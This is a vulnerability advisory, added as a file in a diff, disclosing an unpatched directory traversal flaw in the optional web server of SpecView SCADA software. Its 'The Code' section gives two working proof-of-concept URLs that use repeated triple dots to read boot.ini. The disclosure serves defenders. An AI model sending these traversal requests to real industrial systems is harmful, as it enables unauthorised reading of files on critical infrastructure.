@@ -1,0 +1,70 @@
+#######################################################################
+
+                             Luigi Auriemma
+
+Application:  SpecView
+              http://www.specview.com
+Versions:     <= 2.5 build 853
+Platforms:    Windows
+Bug:          web server directory traversal
+Exploitation: remote
+Date:         29 Jun 2012
+Author:       Luigi Auriemma
+              e-mail: aluigi@autistici.org
+              web:    aluigi.org
+
+
+#######################################################################
+
+
+1) Introduction
+2) Bug
+3) The Code
+4) Fix
+
+
+#######################################################################
+
+===============
+1) Introduction
+===============
+
+
+SpecView is an easy to use SCADA software.
+
+
+#######################################################################
+
+======
+2) Bug
+======
+
+
+The software has an option (disabled by default) that allows to run a
+web server for providing an updated screenshot of the program.
+This built-in web server is affected by a classical directory
+traversal attack through the usage of more than two dots.
+
+
+#######################################################################
+
+===========
+3) The Code
+===========
+
+
+http://SERVER/.../.../.../.../.../.../boot.ini
+http://SERVER/...\...\...\...\...\...\boot.ini
+
+
+#######################################################################
+
+======
+4) Fix
+======
+
+
+No fix.
+
+
+#######################################################################
